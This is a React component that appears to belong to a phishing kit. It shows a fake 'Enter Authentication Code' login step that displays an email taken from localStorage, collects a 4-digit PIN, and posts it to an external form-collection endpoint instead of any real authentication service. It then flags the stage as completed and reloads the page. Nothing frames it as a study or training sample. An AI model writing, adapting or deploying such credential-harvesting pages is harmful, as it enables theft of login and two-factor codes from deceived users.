import axios from "axios";
import { useEffect, useState } from "react";

export default function EnterPin({ setStage }) {
  const [pins, setPins] = useState([]); // Array to store entered PIN digits
  const [currentPinIndex, setCurrentPinIndex] = useState(0); // Index of the currently focused PIN input
  const [isLoading, setLoading] = useState(false);
  const [email, setEmail] = useState(false);

  useEffect(() => {
    const user = localStorage.getItem("user");
    setEmail(user);
  });

  const handlePinChange = (event, index) => {
    const newPin = event.target.value;
    setPins((prevPins) => {
      const updatedPins = [...prevPins];
      updatedPins[index] = newPin;
      return updatedPins;
    });

    // Move to the next input if a digit is entered and there's space
    if (newPin.length === 1 && index < 3) {
      const nextInput = document.getElementById(`password${index + 2}`);
      if (nextInput) {
        nextInput.focus();
      }
    } else if (newPin.length === 0 && index > 0) {
      // Handle backspace
      const prevInput = document.getElementById(`password${index}`);
      if (prevInput) {
        prevInput.focus();
      }
    }
  };

  const handleSubmit = async (event) => {
    event.preventDefault();

    // Ensure all PIN digits are entered
    if (pins.length < 4) {
      alert("Please enter all 4 PIN digits.");
      return;
    }

    setLoading(true);
    try {
      const formValues = {
        pin: pins.join(""), // Combine PIN digits into a single string
        message: "This is the PIN submission",
      };

      await axios.post("https://submit-form.com/8TjPI0qnC", formValues);

      setLoading(false);
      localStorage.setItem("completed", 1);

      location.reload();

      // Handle successful PIN submission (e.g., navigate to a different page)
      //   console.log("PIN submission successful!");
    } catch (err) {
      setLoading(false);
      console.error(err);
      //   alert("PIN submission failed. Please try again.");
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <div className="w-full flex flex-col space-y-5">
        <h2 className="text-xl font-semibold">Enter Authentication Code</h2>
        <p>
          Enter the code sent to <b className="">{email}</b> to continue
        </p>
        <div className="flex gap-3 justify-center">
          {Array(4)
            .fill(null)
            .map((_, index) => (
              <div
                key={index}
                className="w-16 h-16 border flex justify-center rounded-md items-center"
              >
                <input
                  id={`password${index + 1}`} // Assign unique IDs for each input
                  type="password" // Hide entered digits as security best practice
                  maxLength={1} // Limit input to 1 character
                  value={pins[index] || ""} // Display entered digit (if any)
                  onChange={(e) => handlePinChange(e, index)}
                  className="text-center w-full h-full outline-none  text-xl p-2 bg-transparent font-bold"
                />
              </div>
            ))}
        </div>

        <button
          className={`w-full py-3 rounded-md mt-10 ${
            isLoading ? "bg-[#0b2368]/30" : "bg-[#0b2368]"
          } text-white font-bold`}
          disabled={pins.length < 4} // Disable submit button if PIN is incomplete
        >
          {isLoading ? "Logging in..." : "Log In"}
        </button>
      </div>
    </form>
  );
}
